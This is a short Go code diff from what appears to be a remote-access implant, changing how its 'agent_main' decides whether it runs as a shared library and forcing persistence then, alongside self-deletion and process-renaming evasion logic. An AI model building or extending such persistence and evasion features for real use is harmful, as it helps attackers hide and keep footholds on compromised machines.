@@ -59,7 +59,11 @@ func agent_main() {
 	// self delete or not
 	persistence := os.Getenv("PERSISTENCE") == "true"
 	// are we running from loader.so?
-	is_dll := os.Getenv("LD") == "true"
+	is_dll := IsDLL()
+	if is_dll {
+		// we don't want to delete the process executable if we are just a DLL
+		persistence = true
+	}
 
 	do_not_touch_argv := is_dll || is_injected
 	renameProcessIfNeeded(persistence, do_not_touch_argv)
